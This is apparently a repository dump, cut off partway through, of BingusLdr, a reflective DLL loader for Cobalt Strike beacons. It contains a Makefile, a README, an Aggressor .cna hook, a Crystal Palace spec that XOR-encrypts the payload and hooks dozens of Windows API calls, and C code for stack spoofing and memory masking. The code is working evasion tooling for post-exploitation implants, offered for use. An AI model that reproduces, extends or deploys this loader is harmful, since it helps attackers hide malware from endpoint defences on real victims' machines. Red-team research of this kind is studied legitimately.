@@ -1,0 +1,1760 @@
+Project Path: arc_Sizeable-Bingus_BingusLdr_z03yhxo6
+
+Source Tree:
+
+```txt
+arc_Sizeable-Bingus_BingusLdr_z03yhxo6
+├── LICENSE
+├── Makefile
+├── README.md
+├── bingus.cna
+├── bingus.spec
+├── dist
+└── src
+    ├── dfr.h
+    ├── hooks.h
+    ├── loader.c
+    ├── masking.c
+    ├── masking.h
+    ├── runner.c
+    ├── services.c
+    ├── stitch.c
+    ├── stitch.h
+    ├── tcg.h
+    ├── test_dll.c
+    └── unwind.h
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2025 pard0p
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`Makefile`:
+
+```
+CC_64=x86_64-w64-mingw32-gcc
+CFLAGS=-O1 -fno-jump-tables -fno-omit-frame-pointer -shared -Wall -Wno-pointer-arith -masm=intel
+LINK=dist/link
+
+DLL_64=bin/test_dll.x64.dll
+
+.PHONY: all x64 clean
+
+all: x64
+
+bin:
+	mkdir -p bin
+
+x64: bin
+	$(CC_64) -DWIN_X64 $(CFLAGS) src/test_dll.c -o ./bin/test_dll.x64.dll
+	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/services.c -o bin/services.x64.o
+	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/stitch.c -o bin/stitch.x64.o
+	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/masking.c -o bin/masking.x64.o
+	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
+	$(LINK) bingus.spec $(DLL_64) bin/go.x64.bin
+
+clean:
+	rm -rf bin
+
+```
+
+`README.md`:
+
+```md
+# BingusLdr
+
+<p align="center">
+  <img src="peak.png" width="600"/>
+</p>
+
+BingusLdr is a DLL loader built with [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) that uses a CET compatible stack spoofing technique.
+
+
+## Features
+- CET compatible stack spoofing
+- EAF compatible API resolution
+- Heap masking
+- Image masking
+
+See the blog post: [BingusLdr: CET Compatible Stack Spoofing](https://bigbingus.com/posts/bingusldr-cet-stack-spoofing/)
+
+## Prerequisites
+- mingw-w64
+- [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) `link` should be present in `dist/`
+- [libtcg.x64.zip](https://tradecraftgarden.org/tradecraft.html) should bepresent in `tcg/libtcg/`
+
+## Cobalt Strike
+
+- `make`
+- Place `crystalpalace.jar` in the Cobalt Strike client directory
+- Import `bingus.cna`
+
+## Other DLLs
+
+- `make DLL_64=<PAYLOAD>.dll`
+- Output at `./bin/go.x64.bin`
+
+## References
+- [Eden](https://github.com/Cobalt-Strike/eden)
+- [OdinLdr](https://github.com/NtDallas/OdinLdr)
+- [Finding Truth in the Shadows](https://www.elastic.co/security-labs/finding-truth-in-the-shadows)
+- [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html)
+
+```
+
+`bingus.cna`:
+
+```cna
+# https://github.com/rasta-mouse/Crystal-Kit/blob/main/crystalkit.cna
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+sub print_info {
+   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Bingus]\o " . $1 );
+}
+
+set BEACON_RDLL_SIZE {
+   return "0";
+}
+
+set BEACON_RDLL_GENERATE
+{
+    local ( '$beacon $arch $spec_path $spec $cap $final' );
+
+    $beacon = $2;
+    $arch   = $3;
+
+    print_info ( "BEACON_RDLL_GENERATE" );
+
+    $spec_path = getFileProper ( script_resource ( "" ), "bingus.spec" );
+    print_info ( $spec_path );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+    if (strlen($spec) == 0) {
+        warn("[!] Failed to parse bingus.spec");
+        return $null;
+    }
+    $final     = [ $spec run: $beacon, [ new HashMap ] ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
+        return $null;
+    }
+
+    print_info("[+] Bingus ldr payload size: " . strlen($final) . " bytes");
+    return $final;
+}
+
+```
+
+`bingus.spec`:
+
+```spec
+x64:
+    generate $XORKEY 16
+    load "./bin/loader.x64.o"
+        make pic +optimize +mutate +gofirst +relax
+
+        load "bin/services.x64.o"
+            merge
+        load "bin/stitch.x64.o"
+            merge
+        load "bin/masking.x64.o"
+            merge
+
+        patch "xorkey" $XORKEY
+
+        attach "KERNEL32$LoadLibraryA" "_LoadLibraryA"
+        addhook "KERNEL32$LoadLibraryA" "_LoadLibraryA"
+
+        attach "KERNEL32$VirtualAlloc"      "_VirtualAlloc"
+        addhook "KERNEL32$VirtualAlloc"      "_VirtualAlloc"
+        attach "KERNEL32$VirtualProtect"    "_VirtualProtect"
+        addhook "KERNEL32$VirtualProtect"    "_VirtualProtect"
+        preserve "KERNEL32$VirtualProtect" "MaskBeacon"
+        preserve "KERNEL32$VirtualProtect" "UnmaskBeacon"
+        attach "KERNEL32$VirtualAllocEx"    "_VirtualAllocEx"
+        addhook "KERNEL32$VirtualAllocEx"    "_VirtualAllocEx"
+        attach "KERNEL32$VirtualProtectEx"  "_VirtualProtectEx"
+        addhook "KERNEL32$VirtualProtectEx"  "_VirtualProtectEx"
+        attach "KERNEL32$VirtualFree"       "_VirtualFree"
+        addhook "KERNEL32$VirtualFree"       "_VirtualFree"
+        attach "KERNEL32$VirtualQuery"      "_VirtualQuery"
+        addhook "KERNEL32$VirtualQuery"      "_VirtualQuery"
+
+        attach "KERNEL32$HeapAlloc"   "_HeapAlloc"
+        addhook "KERNEL32$HeapAlloc"   "_HeapAlloc"
+        attach "KERNEL32$HeapReAlloc" "_HeapReAlloc"
+        addhook "KERNEL32$HeapReAlloc" "_HeapReAlloc"
+        attach "KERNEL32$HeapFree"    "_HeapFree"
+        addhook "KERNEL32$HeapFree"    "_HeapFree"
+        attach "KERNEL32$HeapDestroy" "_HeapDestroy"
+        addhook "KERNEL32$HeapDestroy" "_HeapDestroy"
+
+        attach "KERNEL32$GetThreadContext"  "_GetThreadContext"
+        addhook "KERNEL32$GetThreadContext"  "_GetThreadContext"
+        attach "KERNEL32$SetThreadContext"  "_SetThreadContext"
+        addhook "KERNEL32$SetThreadContext"  "_SetThreadContext"
+        attach "KERNEL32$ResumeThread"      "_ResumeThread"
+        addhook "KERNEL32$ResumeThread"      "_ResumeThread"
+        attach "KERNEL32$CreateThread"      "_CreateThread"
+        addhook "KERNEL32$CreateThread"      "_CreateThread"
+        attach "KERNEL32$CreateRemoteThread" "_CreateRemoteThread"
+        addhook "KERNEL32$CreateRemoteThread" "_CreateRemoteThread"
+        attach "KERNEL32$ExitThread"        "_ExitThread"
+        addhook "KERNEL32$ExitThread"        "_ExitThread"
+
+        attach "KERNEL32$CreateProcessA" "_CreateProcessA"
+        addhook "KERNEL32$CreateProcessA" "_CreateProcessA"
+        attach "KERNEL32$OpenProcess"     "_OpenProcess"
+        addhook "KERNEL32$OpenProcess"     "_OpenProcess"
+        attach "KERNEL32$OpenThread"      "_OpenThread"
+        addhook "KERNEL32$OpenThread"      "_OpenThread"
+        attach "KERNEL32$CloseHandle"     "_CloseHandle"
+        addhook "KERNEL32$CloseHandle"     "_CloseHandle"
+        attach "KERNEL32$DuplicateHandle" "_DuplicateHandle"
+        addhook "KERNEL32$DuplicateHandle" "_DuplicateHandle"
+
+        attach "KERNEL32$CreateFileMappingA" "_CreateFileMappingA"
+        addhook "KERNEL32$CreateFileMappingA" "_CreateFileMappingA"
+        attach "KERNEL32$MapViewOfFile"   "_MapViewOfFile"
+        addhook "KERNEL32$MapViewOfFile"   "_MapViewOfFile"
+        attach "KERNEL32$UnmapViewOfFile" "_UnmapViewOfFile"
+        addhook "KERNEL32$UnmapViewOfFile" "_UnmapViewOfFile"
+
+        attach "KERNEL32$ReadProcessMemory"  "_ReadProcessMemory"
+        addhook "KERNEL32$ReadProcessMemory"  "_ReadProcessMemory"
+        attach "KERNEL32$WriteProcessMemory" "_WriteProcessMemory"
+        addhook "KERNEL32$WriteProcessMemory" "_WriteProcessMemory"
+
+        attach "KERNEL32$WaitForSingleObject" "_WaitForSingleObject"
+        addhook "KERNEL32$WaitForSingleObject" "_WaitForSingleObject"
+
+        attach "KERNEL32$Sleep" "_Sleep"
+        addhook "KERNEL32$Sleep" "_Sleep"
+
+        attach "USER32$MessageBoxA" "_MessageBoxA"
+        addhook "USER32$MessageBoxA" "_MessageBoxA"
+
+        attach "WININET$InternetConnectA" "_InternetConnectA"
+        addhook "WININET$InternetConnectA" "_InternetConnectA"
+
+        #preserve "KERNEL32$LoadLibraryA" "resolve_ext"
+
+        dfr "resolve" "ror13" "KERNEL32, KERNELBASE, NTDLL"
+        dfr "resolve_ext" "strings"
+
+        fixbss "getBSS"
+
+        mergelib "tcg/libtcg/libtcg.x64.zip"
+
+        push $DLL
+            xor $XORKEY
+            preplen
+            link "my_data"
+
+    export
+
+
+```
+
+`src/dfr.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+#include <process.h>
+#include <wininet.h>
+
+WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect (LPVOID, SIZE_T, DWORD, PDWORD);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery (LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
+WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA (LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA (LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+WINBASEAPI BOOL WINAPI KERNEL32$WaitNamedPipeA (LPCSTR lpNamedPipeName, DWORD nTimeOut);
+WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);
+WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId (VOID);
+WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
+WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+WINBASEAPI VOID WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
+WINBASEAPI DWORD WINAPI KERNEL32$SleepEx (DWORD dwMilliseconds, BOOL bAlertable);
+WINBASEAPI BOOL WINAPI KERNEL32$QueueUserWorkItem (LPTHREAD_START_ROUTINE Function, PVOID Context, ULONG Flags);
+WINUSERAPI int WINAPI USER32$MessageBoxA (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextThread (HANDLE ProcessHandle, HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Flags, PHANDLE NewThreadHandle);
+WINBASEAPI BOOL WINAPI KERNEL32$ConnectNamedPipe (HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
+WINBASEAPI BOOL WINAPI KERNEL32$DisconnectNamedPipe (HANDLE hNamedPipe);
+WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
+WINBASEAPI BOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+WINBASEAPI BOOL WINAPI KERNEL32$WriteFile (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
+WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
+WINBASEAPI BOOL WINAPI KERNEL32$SetEvent (HANDLE hEvent);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventA (LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);
+WINBASEAPI BOOL WINAPI KERNEL32$TerminateThread (HANDLE hThread, DWORD dwExitCode);
+WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE hHandle, DWORD dwMilliseconds);
+WINBASEAPI DWORD WINAPI KERNEL32$FormatMessageA (DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
+WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree (HLOCAL hMem);
+#ifdef _WIN64
+DECLSPEC_IMPORT PRUNTIME_FUNCTION WINAPI KERNEL32$RtlLookupFunctionEntry (DWORD64 ControlPc, PDWORD64 ImageBase, PVOID HistoryTable);
+#endif
+WINBASEAPI BOOL WINAPI KERNELBASE$QueueUserAPC2 (PAPCFUNC ApcRoutine, HANDLE Thread, ULONG_PTR Data, QUEUE_USER_APC_FLAGS Flags);
+WINBASEAPI BOOL WINAPI KERNELBASE$GetProcessMitigationPolicy (HANDLE hProcess, PROCESS_MITIGATION_POLICY MitigationPolicy, PVOID lpBuffer, SIZE_T dwLength);
+WINBASEAPI BOOL WINAPI KERNELBASE$SetProcessMitigationPolicy (PROCESS_MITIGATION_POLICY MitigationPolicy, PVOID lpBuffer, SIZE_T dwLength);
+WINBASEAPI VOID WINAPI KERNEL32$ExitProcess (UINT uExitCode);
+WINBASEAPI BOOL WINAPI KERNEL32$QueryFullProcessImageNameA (HANDLE hProcess, DWORD dwFlags, LPSTR lpExeName, PDWORD lpdwSize);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateJobObjectA (LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
+WINBASEAPI BOOL WINAPI KERNEL32$SetInformationJobObject (HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
+WINBASEAPI BOOL WINAPI KERNEL32$CreatePipe (PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
+WINBASEAPI BOOL WINAPI KERNEL32$SetHandleInformation (HANDLE hObject, DWORD dwMask, DWORD dwFlags);
+WINBASEAPI BOOL WINAPI KERNEL32$AssignProcessToJobObject (HANDLE hJob, HANDLE hProcess);
+WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+DECLSPEC_IMPORT PVOID NTAPI NTDLL$RtlAllocateHeap (PVOID HeapHandle, ULONG Flags, SIZE_T Size);
+DECLSPEC_IMPORT PVOID NTAPI NTDLL$RtlReAllocateHeap (PVOID HeapHandle, ULONG Flags, PVOID MemoryPointer, SIZE_T Size);
+DECLSPEC_IMPORT BOOLEAN NTAPI NTDLL$RtlFreeHeap (PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
+DECLSPEC_IMPORT PVOID NTAPI NTDLL$RtlDestroyHeap (PVOID HeapHandle);
+WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
+WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
+WINBASEAPI LPVOID WINAPI KERNEL32$HeapReAlloc (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
+WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
+WINBASEAPI BOOL WINAPI KERNEL32$HeapDestroy (HANDLE hHeap);
+WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+WINBASEAPI BOOL WINAPI KERNEL32$GetThreadContext (HANDLE hThread, LPCONTEXT lpContext);
+WINBASEAPI BOOL WINAPI KERNEL32$SetThreadContext (HANDLE hThread, LPCONTEXT lpContext);
+WINBASEAPI HANDLE WINAPI KERNEL32$OpenThread (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
+WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileMappingA (HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
+WINBASEAPI LPVOID WINAPI KERNEL32$MapViewOfFile (HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
+WINBASEAPI BOOL WINAPI KERNEL32$UnmapViewOfFile (LPCVOID lpBaseAddress);
+WINBASEAPI BOOL WINAPI KERNEL32$ReadProcessMemory (HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
+WINBASEAPI VOID WINAPI KERNEL32$ExitThread (DWORD dwExitCode);
+WINBASEAPI HINTERNET WINAPI WININET$InternetConnectA (HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
+WINBASEAPI HANDLE WINAPI KERNEL32$GetStdHandle (DWORD nStdHandle);
+WINBASEAPI BOOL WINAPI KERNEL32$PeekNamedPipe (HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
+WINBASEAPI BOOL WINAPI KERNELBASE$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
+WINBASEAPI BOOL WINAPI KERNELBASE$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
+WINBASEAPI LPVOID WINAPI KERNEL32$ConvertThreadToFiber (LPVOID lpParameter);
+WINBASEAPI LPVOID WINAPI KERNEL32$CreateFiber (SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
+WINBASEAPI VOID WINAPI KERNEL32$SwitchToFiber (LPVOID lpFiber);
+WINBASEAPI BOOL WINAPI KERNEL32$IsThreadAFiber (VOID);
+WINBASEAPI VOID WINAPI KERNELBASE$GetCurrentThreadStackLimits (PULONG_PTR LowLimit, PULONG_PTR HighLimit);
+
+WINUSERAPI BOOL WINAPI USER32$PeekMessageA (LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
+WINUSERAPI BOOL WINAPI USER32$GetMessageA (LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
+
+WINBASEAPI char * __cdecl MSVCRT$strcat (char * dest, const char * src);
+WINBASEAPI int __cdecl MSVCRT$sprintf (char * buffer, const char * format, ...);
+WINBASEAPI int __cdecl MSVCRT$atoi (const char * str);
+WINBASEAPI int __cdecl MSVCRT$printf (const char * format, ...);
+WINBASEAPI int __cdecl MSVCRT$vsnprintf (char * __restrict__ d, size_t n, const char * __restrict__ format, va_list arg);
+WINBASEAPI void * __cdecl MSVCRT$malloc (size_t size);
+WINBASEAPI void * __cdecl MSVCRT$calloc (size_t n, size_t size);
+WINBASEAPI void * __cdecl MSVCRT$realloc (void * ptr, size_t size);
+WINBASEAPI void __cdecl MSVCRT$free (void * ptr);
+WINBASEAPI int __cdecl MSVCRT$memcmp (const void * buf1, const void * buf2, size_t count);
+WINBASEAPI char * __cdecl MSVCRT$strncpy (char * dest, const char * src, size_t count);
+WINBASEAPI int __cdecl MSVCRT$abs (int n);
+WINBASEAPI uintptr_t __cdecl UCRTBASE$_beginthread (_beginthread_proc_type StartAddress, unsigned int StackSize, void *ArgList);
+WINBASEAPI BOOL WINAPI PSAPI$EnumProcessModulesEx (HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
+WINBASEAPI BOOL WINAPI KERNEL32$K32EnumProcessModulesEx (HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
+
+```
+
+`src/hooks.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+#include "stitch.h"
+#include "masking.h"
+#include "tcg.h"
+#include "dfr.h"
+
+HANDLE g_thread, g_write, g_read;//g_thread;
+LPVOID g_clean_state, g_run_state;
+PSTITCH_ARG g_stitch_args;
+HEAP_ALLOCATION_LIST g_heap_alloc_list;
+BEACON_STATE g_beacon_state;
+
+FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    if ( (ULONG_PTR)lpProcName >> 16 == 0)
+        return GetProcAddress(hModule, lpProcName);
+
+    FARPROC result = __resolve_hook((ror13hash(lpProcName)));
+    if (result != NULL) return result;
+
+    return GetProcAddress(hModule, lpProcName);
+}
+
+LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect){
+    MaskMemory();
+    LPVOID buffer = (LPVOID)stitch(KERNEL32$VirtualAlloc, 4, lpAddress, dwSize, flAllocationType, flProtect);
+    UnmaskMemory();
+    return buffer;
+}
+
+BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
+    MaskMemory();
+    return (BOOL)stitch(KERNEL32$VirtualProtect, 4, lpAddress, dwSize, flNewProtect, lpflOldProtect);
+    UnmaskMemory();
+}
+
+HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName) {
+    MaskMemory();
+    HMODULE module = (HMODULE)stitch(KERNEL32$LoadLibraryA, 1, lpLibFileName);
+    UnmaskMemory();
+    return module;
+}
+
+INT WINAPI _MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
+    char text[256], caption[256];
+
+    if (lpText) { MSVCRT$strncpy(text, lpText, sizeof(text) - 1); text[sizeof(text) - 1] = 0; lpText = text; }
+    if (lpCaption) { MSVCRT$strncpy(caption, lpCaption, sizeof(caption) - 1); caption[sizeof(caption) - 1] = 0; lpCaption = caption; }
+
+    MaskMemory();
+    INT result = stitch(USER32$MessageBoxA, 4, hWnd, lpText, lpCaption, uType);
+    UnmaskMemory();
+    return result;
+}
+
+VOID WINAPI _Sleep(DWORD dwMiliseconds) {
+    MaskMemory();
+    dprintf("[+] Sleep : %ld\n", dwMiliseconds);
+    stitch(KERNEL32$Sleep, 1, dwMiliseconds);
+    UnmaskMemory();
+}
+
+BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$CreateProcessA, 10, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
+    UnmaskMemory();
+    return success;
+}
+
+LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
+    MaskMemory();
+    LPVOID buffer = (LPVOID)stitch(KERNEL32$VirtualAllocEx, 5, hProcess, lpAddress, dwSize, flAllocationType, flProtect);
+    UnmaskMemory();
+    return buffer;
+}
+
+BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$VirtualProtectEx, 5, hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
+    UnmaskMemory();
+    return success;
+}
+
+BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$VirtualFree, 3, lpAddress, dwSize, dwFreeType);
+    UnmaskMemory();
+    return success;
+}
+
+BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$GetThreadContext, 2, hThread, lpContext);
+    UnmaskMemory();
+    return success;
+}
+
+BOOL WINAPI _SetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$SetThreadContext, 2, hThread, lpContext);
+    UnmaskMemory();
+    return success;
+}
+
+DWORD WINAPI _ResumeThread(HANDLE hThread) {
+    MaskMemory();
+    DWORD suspend_count = (DWORD)stitch(KERNEL32$ResumeThread, 1, hThread);
+    UnmaskMemory();
+    return suspend_count;
+}
+
+HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+    MaskMemory();
+    HANDLE thread = (HANDLE)stitch(KERNEL32$CreateThread, 6, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
+    UnmaskMemory();
+    return thread;
+}
+
+HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+    MaskMemory();
+    HANDLE thread = (HANDLE)stitch(KERNEL32$CreateRemoteThread, 7, hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
+    UnmaskMemory();
+    return thread;
+}
+
+HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
+    MaskMemory();
